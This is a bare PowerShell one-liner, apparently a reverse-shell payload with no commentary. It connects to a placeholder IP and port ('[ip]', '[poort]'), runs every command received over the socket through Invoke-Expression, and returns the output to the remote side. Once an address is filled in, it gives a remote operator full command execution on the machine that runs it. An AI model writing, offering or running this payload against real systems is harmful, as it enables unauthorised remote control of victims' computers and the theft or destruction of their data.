$c = New-Object System.Net.Sockets.TCPClient('[ip]',[poort]);$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$yolo = (iex $d 2>&1 | Out-String );$yolo = ([text.encoding]::ASCII).GetBytes($yolo + '#');$s.Write($yolo,0,$yolo.Length);$s.Flush()};$c.Close();
